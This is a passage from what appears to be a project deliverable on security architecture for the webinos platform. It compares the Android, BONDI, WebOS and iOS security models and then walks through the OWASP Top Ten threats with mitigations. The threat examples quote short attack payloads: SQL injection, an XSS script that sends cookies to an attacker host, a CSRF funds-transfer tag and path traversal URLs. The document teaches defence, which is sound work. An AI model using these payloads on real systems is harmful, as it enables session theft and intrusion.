Related Security and Privacy Architectures
------------------------------------------

### Android

Android is an open source platform derived from Linux 2.6, shaped for mobile devices. The architecture consists of four levels Linux kernel, libraries, application framework and applications. Thus, many access control features are derived by Linux access control (e.g. file permission types). ([[Deliverable_References#AndroidOverview|AndroidOverview]], [[Deliverable_References#AndroidSurvey|AndroidSurvey]])

At the application framework layer, the application developer has access to what Android refers to as "service" processes. Application developers can communicate with these services via an intermediary message bus. For example, a contact application might start a phone call using the services of the telephony manager

Applications can be: user interface applications,intent listeners (that are messages carried over the message bus to allow the inter-process communication), services (similar to UNIX daemon processes) and content providers (data storehouses that provide access to data on the device)

Android security level is based on two different mechanisms. One is the sandboxing provided by the virtualization, the other is the Linux usual access control based on read-write-execute permission tuple.

Each Android application is hosted in a Dalvik VM. This VM is only an optimized interpreter for use on low powered low memory devices. It uses the Java programming language but it is not a Java virtual machine since it differs in the bytecode format. Each application runs sandboxed from each other in its own instance of the Dalvik virtual machine. The kernel is responsible for sandboxing management. Each instance of the Dalvik virtual machine represents a Linux kernel process. Each instance is isolated from the other.
Applications must declare needed permissions for capabilities not provided by the sandbox, so the system prompts the user for consent (at install time).

Permission may be enforced at the following time points ([[Deliverable_References#AndroidSecurity|AndroidSecurity]]):

-   at the time of a call into the system
-   when starting an activity (i.e. an application component)
-   both when sending and receiving broadcasts,
-   when accessing and operating on a content provider
-   when binding to or starting a service

The second security mechanisms is essentially the same of Linux OS. Files and data held by an application are isolated from other applications enforced by the Android Linux kernel and traditional Unix file permissions. To access data from another application, it must first be exposed via a content provider accessed by the message bus.

To ensure application integrity and authenticity, applications must be signed with a certificate whose private key is held by their developer. The certificate identifies the author of the application and does not need to be signed by a certificate authority.

### BONDI

BONDI proposes a general security framework that unifies the modeling, representation and enforcement of security policies ([[Deliverable_References#BONDIv11|BONDIv1.1]]). The framework allows the expression of different forms of security policy based on widget resource signatures. It allows blacklisting and/or whitelisting of widgets, authors and websites.
The model identifies identity types, resources, attributes and conditions, that can be expressed in an XML-based interchange format.
The management of a security policy configuration (i.e. creation and update) could be a source of usability problems, especially for common users.

BONDI establish a minimum baseline for security policy management capability to ensure that web runtimes are manageable. The associated configuration data is interoperable between consuming devices, e.g. asking for a signature associated to each widget to assure provenience and integrity.

Widgets must be signed according to the W3C Widgets 1.0 digital signature specification. The signature allows the web runtime to verify the integrity and authenticity of every file. Widgets must have a valid author signature and one or more valid distributor signature. The web runtime must support processing of certificates that conform to the Wireless Application Protocol WAP Certificate and CRL Profiles Specification.

The dependencies of BONDI web applications are indicated in terms of one or more features, which correspond to specific functionality provided by the web runtime. The web runtime must only enable a web application to use a JavaScript API if a dependency has been explicitly expressed and access to the feature has been granted.

The web runtime must resolve all dependencies of features referenced either statically (at install time) or at instantiation time for widget resources that are instantiated without prior installation. For each referenced feature, the web runtime must perfom an access control query to evaluate the actual granting.

The web runtime must grant access only to features that are advertised as dependencies of the web application. This requires that the access control system is able to control access based on the ID of a feature. It must be possible to represent security policies portably. All identifiers used in a security policy must be portably defined (referring both to feature and device capabilities).

The policy is expressed as a collection of specific access control rules. The rules are organized into groups, termed policies and these in turn are organized into groups termed policy sets. Each rule is specified by defining a condition, which is a set of statements which must be satisfied in order for that particular rule to apply an effect, which represents the ruleâ€™s outcome.

A BONDI web runtime must both use a configured security policy as the sole basis on which access control decisions are made and verify that each use of each feature is permitted by evaluating the feature request against the configured security policy.

To assure policy integrity, a web runtime must only accept signed security policies from authorized security policy provisioning authorities and support at least one security policy provisioning authority.

### WebOS

WebOS 1.2 runs a custom Linux distribution using the Linux 2.6 kernel ([[Deliverable_References#WebOSIntro|WebOSIntro]], [[Deliverable_References#PalmWebOS-swcuc3m|PalmWebOS-swcuc3m]]). On top of the kernel are several system processes and the UI System Manager. This WebOS-specific component is responsible for managing the life cycle of WebOS applications and deciding what to show the user. The UI System Manager is referred to as Luna and lives within /usr/bin/LunaSysMgr. It is a modified version of WebKit but it is not used solely for web page rendering. Rather, all third-party WebOS native applications are authored using web technologies (HTML, JavaScript, CSS) and execute within Luna. So what appears in Linux as one process is in reality internally running several WebOS processes. Lunaâ€™s internal Application Manager controls the life cycle of these processes.

WebOS processes runs entirely within Luna and is not scheduled by Linux. The system processes are traditional Linux processes scheduled by Linux kernelâ€™s scheduler. All Linux processes, including Luna, run with root permissions. Luna enforces per-application permissions and ensures that malicious applications cannot compromise the device. A bug in Luna or its web-rendering engine could be exploited by malicious code to abuse Lunaâ€™s super-user permissions.

WebOS uses Googleâ€™s V8 JavaScript engine which prevents JavaScript from directly modifying memory or controlling the deviceâ€™s hardware. For example, WebOS applications are prevented from directly opening files or devices such as /dev/kmem.

The â€œMojoâ€ framework provides a collection of services and plug-ins that are exposed to JavaScript and may be used by applications to access device functionality. For third-party application developers, Mojo is the window to leveraging the deviceâ€™s capabilities.

There are two broad categories of extensions provided by Mojo: services and plug-ins. Plug-ins are written in C or C++ and implement the Netscape Plugin API (NPAPI). This API provides a bridge between JavaScript, Webkit, and objects written in other languages. The Camera, for example, needed to be written as a plug-in because it accesses device hardware directly. Because Luna knows how to communicate with plug-ins, Luna can load the plug-ins and display them on the same screen along with traditional Mojo framework UI elements. Each plug-in exposes some JavaScript methods that can be used to change the plug-inâ€™s behavior or receive plug-in events. Third-party developers do not generally use plug-ins directly; instead, they use Mojo APIs that will end up invoking the plug-ins.

Services differ from plug-ins because they execute outside of the main Luna process. Each service has a remote procedure call (RPC) interface that applications can use to communicate with the service.

Communication occurs over the â€œPalm Busâ€, a communications bus based on the open-source D-Bus. The bus is a generic communication router that may be used to send and receive messages between applications. System applications can register with the bus to receive messages and access the bus to send messages to other applications. Only Palm applications are currently allowed to register as listeners on the bus. However, all applications use the bus extensively, either directly by using the service API or indirectly by using Mojo APIs that execute D-Bus calls under the covers.

All WebOS applications are identified using the "reverse-dns" naming convention. For example, an application published by iSEC Partners may be called com.isecpartners.webos.SampleApplication. Some applications use the standard D-bus notation, which is the complete path to the executable on disk (for example, /usr/bin/mediaserver). These applications are the extreme exception, and all third-party applications are named using reverse-dns notation.

The naming convention and the Palm Bus work together to play an important role in overall service security. The Palm Bus is divided into two channels: the public channel and the private channel. Not all services listen on both channels. For example, the sensitive SystemManager service only listens on the private channel. The Palm Bus only allows applications under the com.palm.* namespace to send messages to private-channel services. Services that want to be available to all applications, such as the Contacts service, listen on the public channel. Some services listen on both, but expose different service interfaces to each bus.

There are some subtle but important differences between the WebOS JavaScript execution environment and that of a standard web browser. Most notably, WebOS applications are not restricted by the Same Origin Policy. Regardless of their origin, applications can make requests to any site. Although developers may find this capability useful, malware authors may abuse the lack of a Same Origin Policy to communicate with multiple sites in ways that they cannot do within a web browser. The Same Origin Policy still applies to JavaScript executing in WebOSâ€™s web browser, and the standard web application security model is not changed when simply browsing the Web.

### iOS

iPhone OS ([[Deliverable_References#iOS-TechOverview|iOS-TechOverview]], [[Deliverable_References#iPhoneOS-swcuc3m|iPhoneOS-swcuc3m]]) has four abstraction layers ([[Deliverable_References#MacOSX-SecurityArchitecture|MacOSX-SecurityArchitecture]]):
# The Core OS layer contains low-level features. It manages the virtual memory system, threads, the file system, the network, and interprocess communication among the frameworks in the Core OS layer. This layer encompasses the kernel environment, drivers, and basic interfaces of iPhone OS.
# The Core Services layer contains the fundamental system services, e.g. SQlite library, XML support, address book framework, core media framework, core telephony framework, system configuration framework.
# The Media layer contains the graphics, audio, and video technologies which handle the presentation of visual and audible content.
# The Cocoa Touch layer defines the basic application infrastructure and support for technologies such as multitasking, touch-based input, push notifications, and other high-level system services. It is used to implement a graphical, event-driven application.

The iPhone OS security APIs ([[Deliverable_References#MacOSX-SecurityServices|MacOSX-SecurityServices]]) are located in the Core Services layer of the operating system and are based on services in the Core OS (kernel) layer of the operating system. Applications on the iPhone call the security services APIs directly rather than going through the Cocoa Touch or Media layers.
Networking applications can also access secure networking functions through the CFNetwork API, which is also located in the Core Services layer.

#### Security Server Daemon

It implements several security protocols, such as access to keychain items and root certificate trust management.
The Security Server has no public API. Instead, applications use the Keychain Services API and the Certificate, Key, and Trust services API, which in turn communicate with the Security Server. Because iOS do not provide an authentication interface, there is no need for the Security Server to have a user interface.

#### iPhone OS Security APIs

The iPhone OS security APIs are based on services in the Core Services layer, including the Common Crypto library in the libSystem dynamic library.

#### Keychain

The keychain is used to store passwords, keys, certificates, and other secrets. Its implementation, therefore, requires both cryptographic functions to encrypt and decrypt secrets, and data storage functions to store the secrets and related data in files. To achieve these aims, Keychain Services calls the Common Crypto dynamic library.

#### CFNetwork

CFNetwork is a high-level API that can be used by applications to create and maintain secure data streams and to add authentication information to a message. CFNetwork calls underlying security services to set up a secure connection.

#### Certificate, Key, and Trust Services:

The Certificate, Key, and Trust Services API includes functions to create, manage, and read certificates; add certificates to a keychain; create encryption keys; encrypt and decrypt data; sign data and verify signatures; manage trust policies. To carry out all these services, the API calls the Common Crypto dynamic library and other Core OSâ€“level services.

#### Randomization Services

Randomization Services provides cryptographically secure pseudo-random numbers. Pseudo-random numbers are generated by a computer algorithm (and are therefore not truly random), but the algorithm is not discernible from the sequence. To generate these numbers, Randomization Services calls a random-number generator in the Core OS layer.

#### Restrictions On Code Execution

In iOS, every application is sandboxed during installation. The application, its preferences, and its data are restricted to a unique location in the file system and no application can access another applicationâ€™s preferences or data. In addition, an application running in iOS can see only its own keychain items.

#### Code Signing

Digital signatures are required on all applications for iOS. In addition, Apple adds its own signature before distributing an iOS application. Apple does not sign applications that have not been signed by the developer, and applications not signed by Apple simply will not run.

### Lessons learned

From previous analysis. we can distill web applications leverages on a set of well-grounded security techniques, that Webinos should adopt as well in order to counteract many common web attacks. These techniques are:

-   Code signing, to prevent installation/instantiation of non trusted applications (i.e. not authenticated and/or not modified by non authorized parties and/or provided by untrusted parties).
-   Sandboxing, to prevent unwanted influences of one application to another one and or to the runtime.
-   A security policy framework, that is as much simple as possible to avoid usability problems and lead to misconfiguration, but expressive enough to allow detailed access control to any key features and functions.

Threat Models and Threat Analysis
---------------------------------

When securing complex information systems like network web-based application environments, some form of risk or threat analysis needs to be carried out at an early stage. This analysis is used to select countermeasures that form the basis of a system’s security architecture.

Many different standards and methodologies have been proposed for carrying out risk analysis. All share several common themes:

-   A Perimeter definition exercise defines which components are objects under risk analysis scope; these objects may be **physical components** of the system, applications and services, **interactions**, and **dependencies** among services
-   Asset identification defines and characteristics the worth of components inside the perimeter.
-   Threat identification is used to state assumed threats within the scope of analysis.
-   Countermeasure definition and application suggests and checks the effectiveness of protection mechanisms that can be put in place to defend against identified threats

The perimeter definition exercise is an implicit activity as part of WP 3.1. Similarly, assets are being elicited and valued as part of WP 2.8. Because WP 2.8 will be delivered several months after the delivery of WP 3.5, countermeasure definition and, subsequently, proposal of the security architecture will not be fully informed by that work-package. However, it is possible to predict likely threats which are commonly agreed to be critical threats. For this reason, the threats elicited for this deliverable are based on the widely accepted OWASP list of top-ten threats. The threats proposed were derived from both the 2010 and 2007 top-ten lists.

### OWASP threats and vulnerabilities

OWASP (Open Web Application Security Project) is well-known, worldwide, non-profit organization; its purpose is to develop instruments to understand application security. OWASP’s definition of application security is _everything involved in developing, maintaining, and purchasing applications that your organization can trust_ ([[Deliverable_References#OWASP|OWASP]]).

OWASP supports tools for:

-   application security testing,
-   secure software development guidance,
-   advice on the use of application security APIs,
-   cheat sheets to avoid common application security holes,
-   information about common vulnerabilities,
-   taxonomies of threats and threat agents.

As part of the OWASP project, the most relevant security risks are highlighted and discussed, in the OWASP Top Ten 10 Most Critical Web Application Security Risks ([[Deliverable_References#OWASP-Top10|OWASP-Top10]]). These risks are described and detailed below. These risks can be mitigated or avoided adopting secure programming practice and properly shaped APIs. The "OWASP ESAPI (Enterprise Security API) project":https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API addresses the problem of properly shaped functions to mitigate most treacherous application security weaknesses, and describes what kind of API is required to counteract each threat in the top ten.

The top threat and vulnerability descriptions — at the time of writing — are provided below. We describe each threat or vulnerability, together with a simple illustrative example. We then present OWASP mandated guidelines for mitigating the threat or vulnerability, and proposals for webinos countermeasures based on these.

#### Injection

This occurs when untrusted data is sent to an interpreter as part of a command or query. This threat is relevant to webinos when a device exports some application or functionality.

An example of this threat is illustrated below:

<pre>
String query = "SELECT * FROM accounts WHERE custID=‘" + request.getParameter("id") *"’";
</pre>

The attacker modifies the â€˜idâ€™ parameter in their browser

<pre>
http://example.com/app/accountView?id=’ or ’1’=’1
</pre>

OWASP proposes the following mitigations for dealing with this threat.

# Use a safe API which avoids the use of the interpreter entirely or provides a parametrized interface.
# Carefully escape special characters using the specific escape syntax for that interpreter.
# Positive or â€œwhite listâ€ input validation with appropriate "canonicalization".

Based on these proposals, the following webinos countermeasures are proposed.

# Secure code best practices should be adopted by webinos developers. See [[Deliverable_Guidelines|Further Security and Privacy Guidelines]] section for more information.
# webinos applications should be tested with defined patterns of improperly formatted input data.


h4. Cross-Site Scripting (XSS)

This occurs whenever an application takes untrusted data and sends them to a web browser without proper validation and/or escaping

An example of this threat is illustrated below:

<pre>
(String) page*= "<input name=’creditcard’ type=‘TEXTâ€˜ value=’" + request.getParameter("CC") + "‘>";
</pre>

The attacker modifies the â€˜CCâ€™ parameter in their browser to:

<pre>
’><script>document.location=‘http://www.attacker.com/cgi-bin/cookie.cgi?foo=’+document.cookie</script>‘
</pre>

OWASP proposes the following mitigations for dealing with this threat/

# Properly escape all untrusted data based on the HTML context (body, attribute, JavaScript, CSS, or URL) that the data will be placed into.
# Positive or â€œwhite-listâ€ input validation, but is not a complete defense as many applications must accept special characters.
# Consider employing Mozilla’s new Content Security Policy (Firefox 4) to defend against XSS.

Because this threat enables improper cross-application injection and data access, the following webinos countermeasures are proposed.

# Secure code best practices should be adopted by webinos developers. See [[Deliverable_Guidelines|Further Security and Privacy Guidelines]] section for more information.
# webinos applications should be tested against defined patterns of improperly formatted input data.
# webinos runtime could support Mozilla’s Content Security Policy.


h4. Broken Authentication and Session Management

Application functions related to authentication and session management are often not implemented correctly. Examples of this exploitable vulnerability are the following.

* Links like: http://example.com/sale/saleitems;jsessionid=2P0OC2JDPXM0OQSNDLPSKHCJUN2JV?dest=Hawaii pose at stake user security: An unaware user e-mails the link without knowing he is also giving away his session ID
* Applicationâ€™s timeouts arenâ€™t set properly. User uses a public computer to access site. Instead of selecting "logout" the user simply closes the browser tab and walks away
* User passwords are not encrypted, exposing every usersâ€™ password to the attacker.

OWASP proposes the following mitigations for dealing with this threat.

# A single set of strong authentication and session management controls
## Meet all the authentication and session management requirements defined in OWASPâ€™s Application Security Verification Standard (ASVS) areas V2 (Authentication) and V3 (Session Management)
## Have a simple interface for developers. Consider the ESAPI Authenticator and User APIs as good examples to emulate, use, or build upon.
# Avoid XSS flaws which can be used to steal session IDs.

Authentication and session management problems can let an attacker to pose as a webinos legitimate user. Because of this, the following webinos countermeasures are proposed.

# Webinos developer should correctly implement application functions related to authentication and session management.
# A simple interface will be exposed to developers. Mutual authentication is taken care of by the transport layer in webinos.


h4. Insecure Direct Object References

This occurs when a developer exposes a reference to an internal implementation object. The example below illustrates how this vulnerability can be exploited.

<pre>
String query = "SELECT * FROM accts WHERE account = ?";
PreparedStatement pstmt = connection.prepareStatement(query , … );
pstmt.setString( 1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );
</pre>

The attacker simply modifies the â€˜acctâ€™ parameter in their browser to send whatever account number they want:

<pre>
http://example.com/app/accountInfo?acct=notmyacct
</pre>

OWASP proposes the following mitigations for dealing with this threat:

# Use per user or session indirect object references.
# Check access.

To deal with this threat, webinos should provide developers with simple check access mechanisms.

h4. Cross-Site Request Forgery (CSRF)

This attack forces the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim; this allows an attacker to generate requests posing as a legitimate webinos user.

An example of a CSRF is provided below:

<pre>
<img src="http://example.com/app/transferFunds?amount=1500&destinationAccount=attackersAcct#â€œwidth="0" height="0" />
</pre>

To mitigate this threat, OWASP proposes the inclusion of a unpredictable token in the body or URL of each HTTP request. Such tokens should at a minimum be unique per user session, but can also be unique per request. More specifically, the following requirements for tokens need to be satisfied:

# Include the unique token in a hidden field. This causes the value to be sent in the body of the HTTP request.
# Include the unique token in the URL itself, or a URL parameter. However, such placement runs the risk that the URL will be exposed to an attacker, thus compromising the secret token.

To deal with this threat, webinos developer should include an unpredictable token in each request.


h4. Security Misconfiguration

Good security posture requires definition and deployment of a secure configuration. Attacker can take advantage of misconfiguration to exploit some other vulnerability. Examples of non-secure configuration include the following.

* Not updating your libraries.
* The application server admin console is automatically installed and not removed. Default accounts aren’t changed.
* Directory listing is not disabled on your server.
* Application server configuration allows stack traces to be returned to users.

OWASP proposes the following mitigations for dealing with this vulnerability.

# A repeatable hardening process that makes it fast and easy to deploy another environment that is properly locked down.
# A process for keeping abreast of and deploying all new software updates and patches in a timely manner to each deployed environment.
# A strong application architecture that provides good separation and security between components.
# Run scans and do audits periodically to help detect future misconfigurations or missing patches.

Based on these proposals, the following webinos countermeasures are proposed.

# Provide developers with means to easily write clear policies.
# Mandate the use of policies (and provide a restrictive default policy).


h4. Insecure Cryptographic Storage

Many web applications do not properly protect sensitive data. This can provide an attacker access to sensitive data.

Example of insecure cryptographic storage include the following.

* The database is set to automatically decrypt queries against the credit card columns, allowing an SQL injection flaw to retrieve all the credit cards in cleartext.
* A backup tape is made of encrypted health records, but the encryption key is on the same backup.
* The password database uses unsalted hashes to store everyone’s passwords.

OWASP proposes the following mitigations for dealing with this vulnerability:

# Considering the threats you plan to protect this data from (e.g., insider attack, external user), make sure you encrypt all such data at rest in a manner that defends against these threats.
# Ensure offsite backups are encrypted, but the keys are managed and backed up separately.
# Ensure appropriate strong standard algorithms and strong keys are used, and key management is in place.
# Ensure passwords are hashed with a strong standard algorithm and an appropriate salt is used.
# Ensure all keys and passwords are protected from unauthorized access.

Based on these proposals, the following webinos countermeasures are proposed.

# Provide developers with means to easily encrypt data.
# Automatically use encrypted storage for apps (every app should have its own encrypted storage).

h4. Failure to Restrict URL Access

Applications need to perform access control checks each time protected pages are accessed. Failure to do so might allow an attacker to access protected pages. For example, access to the following pages should be protected:

http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo

OWASP proposes preventing unauthorized URL access requires by selecting an approach for requiring proper authentication and proper authorization for each page. When selecting an approach, the following points should be considered.

# The authentication and authorization policies be role based, to minimize the effort required to maintain these policies.
# The policies should be highly configurable, in order to minimize any hard coded aspects of the policy.
# The enforcement mechanism(s) should deny all access by default, requiring explicit grants to specific users and roles for access to every page.
# If the page is involved in a workflow, check to make sure the conditions are in the proper state to allow access.

Based on the suggestions, webinos PEPs should check page accesses using suitable policies.


h4. Insufficient Transport Layer Protection

Applications frequently fail to authenticate, encrypt, and protect the confidentiality and integrity of sensitive network traffic. Consequently, an attacker may steal sensitive data from unprotected traffic.

Sites open to this vulnerability include the following.

* Sites that don’t use SSL for all pages that require authentication.
* Sites with improperly configured SSL certificate; these cause browser warnings for its users, who then become accustomed to such warnings.
* Sites using default ODBC/JDBC for the database connection, which sends all traffic in the clear.

OWASP makes the following suggestions for dealing with this vulnerability.

# Require SSL for all sensitive pages. Non-SSL requests to these pages should be redirected to the SSL page.
# Set the â€˜secureâ€™ flag on all sensitive cookies.
# Configure your SSL provider to only support strong algorithms.
# Ensure your certificate is valid, not expired, not revoked, and matches all domains used by the site.
# Backend and other connections should also use SSL or other encryption technologies.

Based on these suggestions, webinos should use policies requesting encryption, when advisable.

h4. Unvalidated Redirects and Forwards

Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages. This can potentially allow an attacker to hijack a user’s session.

Two examples of exploits which take advantage of this behaviour are as follows.

* The attacker crafts a malicious URL that redirects users to a malicious site that performs phishing and installs malware, e.g. http://www.example.com/redirect.jsp?url=evil.com
* The attacker crafts a URL that will pass the application’s access control check and then forward the attacker to an administrative function that she would not normally be able to access, e.g. http://www.example.com/boring.jsp?fwd=admin.jsp

OWASP makes the following suggestions for dealing with this vulnerability.

# Avoid using redirects and forwards.
# If used, don’t involve user parameters in calculating the destination.
# If destination parameters can’t be avoided, ensure that the supplied value is valid, and authorized for the user. It is recommended that any such destination parameters be a mapping value, and that server side code translate this mapping to the target URL.

Based on these proposals, the following webinos countermeasures are proposed.

# Secure code best practices should be adopted by webinos developers. See [[Deliverable_Guidelines|Further Security and Privacy Guidelines]] section for more information.
# webinos applications should be tested with defined patterns of improperly formatted input data.


h4. Malicious File Execution.

Code vulnerable to remote file inclusion (RFI) allows attackers to include hostile code and data. This can allow an attacker to execute malicious code.

For example:

<pre>
include $_REQUEST[’filenameâ€™];
</pre>

OWASP makes the following suggestions for dealing with this vulnerability.

# Use an indirect object reference map.
# Use explicit taint checking mechanisms, if your language supports it.
# Strongly validate user input using "accept known good" as a strategy.
# Add firewall rules to prevent web servers making new connections to external web sites and internal systems.
# Check user supplied files or filenames.
# Consider implementing a chroot jail or other sand box mechanisms.

Based on these proposals, the following webinos countermeasures are proposed.

# Secure code best practices should be adopted by webinos developers. See [[Deliverable_Guidelines|Further Security and Privacy Guidelines]] section for more information.
# Use policies to prevent web servers making new connections to external web sites and internal systems.
# Use sand box mechanisms.

h3. Early results from Task 2.8

Task 2.8 is performing a security analysis to identify, qualify and represent the most significant risks to webinos. The final report of T2.8 will present misuse cases representing the most significant risks the project faces, together with a list of findings based on the experiment and updated personas if necessary.

Since the work performed in T 2.8 is very strictly linked to the security architecture, it is useful to report here the preliminary work on threat and misuse detection, mentioning which part of the security architecture will have a role to prevent the threat.


h4. Cross Site Request Forgery (CSRF)

The attacker tricks the victim into loading a page that contains a request that inherits the webinos identity and privileges of the victim to perform an undesired function on the belief of the victim.
It is possible to prevent the CSRF including an unpredictable token in the body or URL of each HTTP request.

Reference security architecture section: "Authentication and User Identity Management".


h4. Man-In-The-Middle Attack

The man-in-the middle attack intercepts a communication between two systems. For example, in an http transaction the target is the TCP connection between client and server. Using different techniques, the attacker splits the original TCP connection into 2 new connections, one between the client and the attacker and the other between the attacker and the server. Once the TCP connection is intercepted, the attacker acts as a proxy, being able to read, insert and modify the data in the intercepted communication.
It is possible to prevent the Man-In-The-Middle Attack using authentication.

Reference security architecture section: "Authentication and User Identity Management".


h4. NFC replay Attack

Using a ghost and leech device, an attacker forwards a request to the victim’s reader device and relays the answer back in real time via a webinos overlay network.
It could be prevented restricting the access to NFC APIs.

Reference security architecture section: "Security-Policy-Architecture"/"Privileged Applications"


h4. Online Fraud

A malicious application instance misuses a user’s shopping and payment information for the incorrect gain/loss of money or products for either the user, the seller, the attacker, or any other person.
The attack description can encompass a broad set of attack types (Data Structure Attack Threat, Embedded Malicious Code Threat, Injection Threat, Resource Manipulation Threat, Protocol Manipulation Threat, Exploitation of Authentication Threat).

Reference security architecture section (being the attack carried out using a malicious application): "Application Certification and Trust Chains"


h4. Repudiation attack

Malicious manipulation or forging the identification of new actions. This attack changes the authoring information of actions executed by a malicious user in order to log wrong data to log files. Its usage could be extended to general data manipulation in the name of others, in a similar manner as spoofing mail messages. If this attack takes place, the data stored on log files can be considered invalid or misleading.

Reference security architecture section: "Authentication and User Identity Management".


h4. Spyware

A malicious application captures private information and sends it out of a device without user acceptance.

Reference security architecture section: "Privacy Policy Architecture".


h4. Autologin abuse

This exploits the Security misconfiguration vulnerability previously described.

If the autologin is enabled, an attacker can authenticate himself as the default user

Reference security architecture section: "Authentication and User Identity Management".


h4. Session hijacking

This exploits the Broken authentication and session management threat previously described.

User uses a public computer to access site. Instead of selecting "logout" the user simply closes the browser tab and walks away. Attacker uses the same browser later, and that browser is still authenticated

Reference security architecture section: "Authentication and User Identity Management".


h4. PZH access abuse

This is exploits the Security misconfiguration vulnerability previously described.

If the PZH access is unprotected, the attacker can retrieve the personal zone device list

Reference security architecture section: "Authentication and User Identity Management".


h4. Cryptanalysis

This exploits the Insecure Crytographic Storage vulnerability previously described.

A weak (or absent) encryption algorithm may let an attacker access to user personal data on the mass memory.

Reference security architecture section: "Secure Storage".


h4. Personal Zone Subversion

Stolen user credentials may let an attacker to take the control over the user personal zone

Reference security architecture section: "Authentication and User Identity Management".


h4. Network eavesdropping

This is exploits the Security misconfiguration vulnerability previously described.

Unprotected channels may allow an attacker to eavesdrop communications. In could be particularly dangerous for PZH/PZPs synchronization messages.

h4. Denial of Service

Flooding a Personal Zone Hub may hamper Personal Zone communications.

Reference security architecture section: "Personal Zone Security"


h4. Jamming

Wireless communications usage among personal zone nearby devices may expose them to jamming.

Reference security architecture section: "Personal Zone Security"


h4. Account lockout attack

The attacker attempts to lock out all user accounts, typically by failing login more times than the threshold defined by the authentication system. An account lockout attack on PZH could hamper devices to connect outside the personal zone.

Reference security architecture section: "Authentication and User Identity Management".


h4. Argument Injection or Modification

When a device exports services outside the personal zone, it can be subjected to this attack.
If the configuration allows for that, the attacker may, for example, try to pass argument $authorized=1 as input data to application, to authorize himself ad administrator.

Reference security architecture section: "Personal zone security"/"Session security".


h4. Asymmetric resource consumption (amplification)

The scenario is: the device calls a remote service, and policies allow the service to access personal zone local resources.
If the service fails to release or incorrectly releases a system resource, this resource is not properly cleared and made available for re-use.

h4. Direct Dynamic Code Evaluation (’Eval Injection’)

When a device exports services outside the personal zone, it can be subjected to this attack.
If user inputs to a script are not properly validated, a remote user can supply a specially crafted URL to pass arbitrary code to an eval() statement, which results in code execution.

#### Direct Static Code Injection

When a device exports services outside the personal zone, it can be subjected to this attack.
It consists of injecting code directly onto the resource used by application while processing a user request. This is normally performed by tampering libraries and template files which are created based on user input without proper data sanitization.

#### Man-in-the-browser attack

The Man-in-the-Browser attack is the same approach as Man-in-the-middle attack, but in this case a Trojan Horse is used to intercept and manipulate calls between the main application’s executable (ex: the browser) and its security mechanisms or libraries on-the-fly.
The most common objective of this attack is to cause financial fraud by manipulating transactions of Internet Banking systems, even when other authentication factors are in use.

Reference security architecture section: "Extension Handling".

#### Mobile code: invoking untrusted mobile code

This attack consists of a manipulation of a mobile code in order to execute malicious operations at the client side. The malicious mobile code could be hosted in an untrustworthy web site or it could be permanently injected on a vulnerable web site through an injection attack.

Reference security architecture section: "Application Certification and Trust Chains".

#### Path traversal

When a device exports services outside the personal zone, it can be subjected to this attack.
The attacker aims to access files and directories that are stored outside the root folder. He looks for absolute links to files by manipulating variables that reference files with â€œdot-dot-slash (../)â€ sequences and its variations.

Reference security architecture section: "Personal zone security".

#### Unicode Encoding

When a device exports services outside the personal zone, it can be subjected to this attack.
The attack aims to explore flaws in the decoding mechanism implemented on applications when decoding Unicode data format.
An attacker can use this technique to encode certain characters in the URL to bypass application filters, thus accessing restricted resources.

Original Path Traversal attack URL (without Unicode Encoding):

<pre>
http://vulneapplication/../../appusers.txt
</pre>

Path Traversal attack URL with Unicode Encoding:

<pre>
http://vulneapplication/%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFappusers.txt
</pre>

#### Web Parameter Tampering

It is based on the manipulation of parameters exchanged between client and server in order to modify application data, such as user credentials and permissions, price and quantity of products, etc.
